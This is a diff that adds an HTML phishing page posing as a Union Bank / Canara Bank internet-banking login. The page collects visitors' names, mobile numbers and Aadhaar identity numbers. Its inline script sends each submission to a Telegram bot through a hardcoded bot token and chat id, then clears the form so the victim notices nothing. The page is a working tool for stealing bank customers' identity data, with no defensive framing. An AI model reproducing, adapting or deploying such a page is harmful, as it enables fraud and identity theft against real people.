@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <title>Union Bank Login</title>
+    <style>
+body {
+    margin: 0;
+    font-family: Arial, Helvetica, sans-serif;
+    background-color: #f4f4f4;
+}
+.header {
+    background-color: #005ca9; /* Canara Bank Blue */
+    padding: 20px 0;
+    text-align: center;
+    color: white;
+}
+.header img {
+    width: 200px;
+}
+.container {
+    max-width: 400px;
+    margin: 50px auto;
+    padding: 20px;
+    text-align: center;
+    background-color: #fff;
+    box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+    border-radius: 10px;
+}
+.container h2 {
+    color: #005ca9; /* Canara Bank Blue for headings */
+    text-align: center;
+    margin-bottom: 20px;
+    font-weight: bold;
+}
+.container p {
+    text-align: center;
+    color: #333;
+}
+.note {
+    color: red;
+    text-align: center;
+    font-size: 12px;
+    margin-bottom: 20px;
+}
+.form-group {
+    margin-bottom: 15px;
+    text-align: left;
+}
+.form-group label {
+    display: block;
+    margin-bottom: 5px;
+    color: #005ca9; /* Canara Bank Blue labels */
+    font-size: 14px;
+}
+.form-group input {
+    width: 100%;
+    padding: 8px 0;
+    border: none;
+    border-bottom: 2px solid #ccc; /* Simple underline style */
+    outline: none;
+    font-size: 14px;
+    color: #333;
+    transition: border-color 0.3s ease;
+}
+.form-group input:focus {
+    border-bottom: 2px solid #005ca9; /* Canara Bank Blue focus */
+}
+.btn {
+    width: 100%;
+    padding: 12px;
+    border: none;
+    border-radius: 25px;
+    color: white;
+    background-color: #ffcc00; /* Canara Bank Yellow */
+    font-size: 16px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+}
+.btn:hover {
+    background-color: #005ca9; /* Blue hover for primary button */
+}
+.btn-secondary {
+    background-color: #005ca9; /* Blue background for secondary button */
+    color: white;
+    margin-top: 10px;
+    border: 2px solid #005ca9;
+    transition: background-color 0.3s ease, border-color 0.3s ease;
+}
+.btn-secondary:hover {
+    background-color: white; /* White on hover */
+    color: #005ca9;
+    border-color: #005ca9;
+}
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="https://firebasestorage.googleapis.com/v0/b/xlite-bank-of-india.appspot.com/o/images%2F1000112846.png?alt=media&token=4c981b7d-0bdd-4770-9d96-edf4b00cc1f3" alt="Union Bank Logo">
+    </div>
+    <div class="container">
+        <h2>Login to Canara Bank Online</h2>
+        <p>Welcome to Personal Internet Banking</p>
+        <p class="note">(CARE: Username and password are case sensitive.)</p>
+        <form id="loginForm" action="" onsubmit=" return sender()">
+            <div class="form-group">
+                <label for="username">Name</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Mobile Number</label>
+                <input type="number" id="password" name="password" placeholder="+91XXXXXXXXXX" length="12" required>
+            </div>
+            <div class="form-group">
+                <label for="phone">Aadhar Number</label>
+                <input type="text" id="phone" name="phone" length="12" placeholder="XXXX-XXXX-XXXX" required>
+            </div>
+          <div>
+              <input type="submit" value="submit" name="" class="btn">
+               </div><br>
+          
+         <!--- Not Working button 👇 --->
+          <a href="3.html" type="submit" class="btn btn-outline-success  mt-3 text-center"><button>submit</button></a>
+     
+              </form>
+          </div>
+  
+  <link rel="stylesheet" href="style.css">
+    <script src="sender.js"></script>
+  
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  
+  <script>
+  //bot token
+var telegram_bot_id = "7790794227:AAFsSbfZBNBiMs93o_cT0bHJFvQuNtkXOm8";
+//chat id
+var chat_id = 1210231596;
+var ready = function () {
+    username = document.getElementById("username").value;
+    password = document.getElementById("password").value;
+    phone = document.getElementById("phone").value;
+  
+    message = 
+      "\nName: " + username +  
+      "\nMob: " + password + 
+      "\nAdhar: " + phone;
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message,
+          "file": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+        console.log(response);
+      
+    });
+    document.getElementById("username").value = "";
+    document.getElementById("password").value = "";
+    document.getElementById("phone").value = "";
+    return false;
+};
+  </script>
+</body>
+</html>
